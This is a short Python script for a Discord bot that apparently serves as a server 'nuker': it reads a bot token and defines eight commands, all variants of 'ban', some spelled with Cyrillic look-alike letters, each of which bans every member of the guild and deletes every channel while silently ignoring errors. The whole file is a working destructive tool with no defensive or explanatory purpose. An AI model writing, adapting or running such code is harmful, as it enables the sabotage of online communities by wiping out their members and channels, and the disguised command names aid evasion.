import discord
import discord.ext.commands


TOKEN = input() + input()
bot = discord.ext.commands.Bot(command_prefix = "!")

@bot.command()
async def bаn(ctx, arg):
    for user in ctx.guild.members:
        print('ban')
        try:
            await ctx.guild.ban(user)
        except:
            pass
    for chanel in ctx.guild.channels:
        print('ban')
        try:
            await chanel.delete()
        except:
            pass


@bot.command()
async def ban(ctx, arg):
    for user in ctx.guild.members:
        print('ban')
        try:
            await ctx.guild.ban(user)
        except:
            pass
    for chanel in ctx.guild.channels:
        print('ban')
        try:
            await chanel.delete()
        except:
            pass


@bot.command()
async def BаN(ctx, arg):
    for user in ctx.guild.members:
        print('ban')
        try:
            await ctx.guild.ban(user)
        except:
            pass
    for chanel in ctx.guild.channels:
        print('ban')
        try:
            await chanel.delete()
        except:
            pass
@bot.command()
async def BАN(ctx, arg):
    for user in ctx.guild.members:
        print('ban')
        try:
            await ctx.guild.ban(user)
        except:
            pass
    for chanel in ctx.guild.channels:
        print('ban')
        try:
            await chanel.delete()
        except:
            pass
@bot.command()
async def BAN(ctx, arg):
    for user in ctx.guild.members:
        print('ban')
        try:
            await ctx.guild.ban(user)
        except:
            pass
    for chanel in ctx.guild.channels:
        print('ban')
        try:
            await chanel.delete()
        except:
            pass
@bot.command()
async def Ban(ctx, arg):
    for user in ctx.guild.members:
        print('ban')
        try:
            await ctx.guild.ban(user)
        except:
            pass
    for chanel in ctx.guild.channels:
        print('ban')
        try:
            await chanel.delete()
        except:
            pass
@bot.command()
async def baN(ctx, arg):
    for user in ctx.guild.members:
        print('ban')
        try:
            await ctx.guild.ban(user)
        except:
            pass
    for chanel in ctx.guild.channels:
        print('ban')
        try:
            await chanel.delete()
        except:
            pass
@bot.command()
async def bаN(ctx, arg):
    for user in ctx.guild.members:
        print('ban')
        try:
            await ctx.guild.ban(user)
        except:
            pass
    for chanel in ctx.guild.channels:
        print('ban')
        try:
            await chanel.delete()
        except:
            pass

bot.run(TOKEN)
